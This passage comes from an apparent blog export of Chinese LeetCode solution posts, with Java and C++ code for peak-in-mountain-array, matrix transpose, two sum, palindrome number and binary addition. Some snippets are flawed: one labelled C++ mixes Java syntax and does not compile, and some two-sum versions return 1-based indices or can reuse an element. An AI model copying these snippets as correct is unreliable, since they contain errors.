<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int peakIndexInMountainArray(int[] A) &#123;</span><br><span class="line">        int index &#x3D; 0;</span><br><span class="line">        int result &#x3D; 0;</span><br><span class="line">        int end &#x3D; A.size() - 2;</span><br><span class="line">        while (index &lt;&#x3D; end) &#123;</span><br><span class="line">        	if (A[index] &lt; A[index + 1]) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; else if (A[index] &gt; A[index + 1]) &#123;</span><br><span class="line">        		result &#x3D; index;</span><br><span class="line">        		break;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找，每次找到A[i]，确认是否A[i] &lt; A[i + 1]，不是的话，不断缩小上届和下界，找到最大的i为止。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = A.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mi = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mi] &lt; A[mi + <span class="number">1</span>]) &#123;</span><br><span class="line">                lo = mi + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hi = mi;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = A.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mi = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mi] &lt; A[mi + <span class="number">1</span>]) &#123;</span><br><span class="line">                lo = mi + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hi = mi;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>867. 转置矩阵</title>
    <url>/2018/08/29/LeetCode/leetcode-000867.%20%E8%BD%AC%E7%BD%AE%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个矩阵 <code>A</code>， 返回 <code>A</code> 的转置矩阵。</p>
<p>矩阵的转置是指将矩阵的主对角线翻转，交换矩阵的行索引与列索引。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[1,2,3],[4,5,6],[7,8,9]]</span><br><span class="line">输出：[[1,4,7],[2,5,8],[3,6,9]]</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[1,2,3],[4,5,6]]</span><br><span class="line">输出：[[1,4],[2,5],[3,6]]</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li><code>1 &lt;= A.length &lt;= 1000</code></li>
<li><code>1 &lt;= A[0].length &lt;= 1000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照矩阵转置的方法，将i,j上的数换至j,i上即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] transpose(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> R = A.length, C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] ans = <span class="keyword">new</span> <span class="keyword">int</span>[C][R];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; R; ++r)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; C; ++c) &#123;</span><br><span class="line">                ans[c][r] = A[r][c];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">transpose</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> R = A.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> C = A[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">result</span><span class="params">(C, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(R, <span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>; r &lt; R; ++r)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> c = <span class="number">0</span>; c &lt; C; ++c) &#123;</span><br><span class="line">                result[c][r] = A[r][c];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>1.两数之和</title>
    <url>/2018/08/28/LeetCode/leetcode-000001-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组和一个目标值，找出数组中和为目标值的两个数。</p>
<p>你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。</p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：-暴力破解"><a href="#解法一：-暴力破解" class="headerlink" title="解法一： 暴力破解"></a>解法一： 暴力破解</h3><p>暴力破解很简单，遍历两遍列表，找到对应的元素x，和 target - x 即可。时间复杂度为O(n*n).</p>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i;j &lt; nums.length;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;i, j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No such value pair."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; nums.<span class="built_in">size</span>();j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    result.emplace_back(i);</span><br><span class="line">                    result.emplace_back(j);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-03-02-000001-bruteforce.PNG" alt="暴力破解"></p>
<h3 id="解法二：二次遍历"><a href="#解法二：二次遍历" class="headerlink" title="解法二：二次遍历"></a>解法二：二次遍历</h3><p>借助HashMap将数值和位置的关系保存起来。然后再遍历nums，判断X和target-X是否同时在HashMap中即可。时间复杂度为O(n).</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> complement = target - nums[i];</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(complement) &amp;&amp; map.get(complement) != i) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; i, map.get(complement) &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No two sum solution"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="built_in">map</span>.insert(make_pair(nums[i], i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> value = target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>.<span class="built_in">find</span>(value) != <span class="built_in">map</span>.<span class="built_in">end</span>() &amp;&amp; <span class="built_in">map</span>.<span class="built_in">find</span>(value)-&gt;second != i) &#123;</span><br><span class="line">                result.emplace_back(i);</span><br><span class="line">                result.emplace_back(<span class="built_in">map</span>.<span class="built_in">find</span>(value)-&gt;second);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：一次遍历"><a href="#解法三：一次遍历" class="headerlink" title="解法三：一次遍历"></a>解法三：一次遍历</h3><p>只遍历一次HashMap。</p>
<p>该解法是在遍历数组时，寻找target - x的值是否在HashMap中，如果未在HashMap中，则现将当前值存入，否则继续遍历。<br>拿题目<code>nums = [2, 7, 11, 15], target = 9</code>为例，当遍历到2时，target - x 为 7，7不在HashMap中，将2存入HashMap，接着遍历至7，target - 7 = 2， 此时，2 在HashMap中，完成搜索，直接返回即可。</p>
<h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; numPosition = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; nums.length;index++) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = target - nums[index];</span><br><span class="line">        <span class="keyword">if</span> (numPosition.containsKey(temp) &amp;&amp; numPosition.get(temp) != index) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;index, numPosition.get(temp)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        numPosition.put(nums[index], index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No two sum solution"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-2"><a href="#CPP-2" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>.<span class="built_in">find</span>(target - nums[i]) != <span class="built_in">map</span>.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                result.emplace_back(<span class="built_in">map</span>.<span class="built_in">find</span>(target - nums[i])-&gt;second);</span><br><span class="line">                result.emplace_back(i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">map</span>.insert(make_pair(nums[i], i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-03-02-000001-hashmap.PNG" alt="使用HashMap"></p>
<h3 id="解法四：借助数组，二次遍历"><a href="#解法四：借助数组，二次遍历" class="headerlink" title="解法四：借助数组，二次遍历"></a>解法四：借助数组，二次遍历</h3><p>首先拷贝一份数组数据，排序，然后一次遍历用头尾指针找到对应和未target的数值。最后在原nums数组中找到这两个数值的索引，返回即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] copy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> last = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (first &lt; last) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[first] + nums[last] == target) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[first] + nums[last] &gt; target) &#123;</span><br><span class="line">                last--;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[first] + nums[last] &lt; target) &#123;</span><br><span class="line">                    first++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result1 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> result2 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; copy.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (-<span class="number">1</span> == result1 &amp;&amp; copy[i] == nums[first]) &#123;</span><br><span class="line">                result1 = i;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (-<span class="number">1</span> == result2 &amp;&amp; copy[i] == nums[last]) &#123;</span><br><span class="line">                result2 = i;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;result1, result2&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> vector&lt;<span class="keyword">int</span>&gt; *numbersCopy;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> bool <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> idx1, <span class="keyword">int</span> idx2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (*numbersCopy)[idx1] &lt; (*numbersCopy)[idx2];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        numbersCopy = &amp;numbers;</span><br><span class="line">        <span class="keyword">int</span> n = numbers.size();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">idx</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            idx[i] = i;</span><br><span class="line">        sort(idx.begin(), idx.end(), Solution::cmp);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> head = <span class="number">0</span>, tail = n-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(head &lt; tail)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(numbers[idx[head]] + numbers[idx[tail]] &lt; target)</span><br><span class="line">                head++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(numbers[idx[head]] + numbers[idx[tail]] &gt; target)</span><br><span class="line">                tail--;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//found</span></span><br><span class="line">            &#123;</span><br><span class="line">                res.push_back(min(idx[head], idx[tail]) + <span class="number">1</span>);</span><br><span class="line">                res.push_back(max(idx[head], idx[tail]) + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; * Solution::numbersCopy = NULL;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>9.回文数</title>
    <url>/2018/08/28/LeetCode/leetcode-000009-%E5%9B%9E%E6%96%87%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>进阶：你能不将整数转为字符串来解决这个问题吗？</strong></p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="简单版解法"><a href="#简单版解法" class="headerlink" title="简单版解法"></a>简单版解法</h3><p>将数字转换成字符串，翻转，然后和原来的字符串比较就行。需要注意的是小于0的数字肯定不是回文数，1-9的数字肯定是回文数字。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> &lt;= x &amp;&amp; x &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> StringBuffer().append(x).reverse().toString().equals(x + <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>(x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        <span class="keyword">int</span> div = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(x / <span class="number">10</span> &gt;= div) &#123;</span><br><span class="line">            div *= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> high = x / div;</span><br><span class="line">            <span class="keyword">int</span> low = x % <span class="number">10</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(high != low) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            x = (x % div) / <span class="number">10</span>;</span><br><span class="line">            div /= <span class="number">100</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000002-reverse.PNG" alt="Reverse"></p>
<h3 id="进阶版解法"><a href="#进阶版解法" class="headerlink" title="进阶版解法"></a>进阶版解法</h3><p>没做出来，具体解法可参见<br><a href="https://leetcode-cn.com/problems/palindrome-number/solution/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-number/solution/</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode 算法</tag>
      </tags>
  </entry>
  <entry>
    <title>67.二进制求和</title>
    <url>/2018/08/28/LeetCode/leetcode-000067.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B1%82%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个二进制字符串，返回他们的和（用二进制表示）。</p>
<p>输入为非空字符串且只包含数字 <code>1</code> 和 <code>0</code>。<br><strong>示例一：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: a &#x3D; &quot;11&quot;, b &#x3D; &quot;1&quot;</span><br><span class="line">输出: &quot;100&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例二：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: a &#x3D; &quot;1010&quot;, b &#x3D; &quot;1011&quot;</span><br><span class="line">输出: &quot;10101&quot;</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p><strong>解法一：</strong><br>利用Java自带的库函数，将两个二进制的数字转换为整型，再将两个整型相加的结果转换为字符串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> numa = Integer.valueOf(a, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> numb = Integer.valueOf(b, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> Integer.toBinaryString(numa + numb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000067-lib-func-add.PNG" alt="库函数相加"></p>
<p><strong>解法二：</strong><br>字符串大数相加：</p>
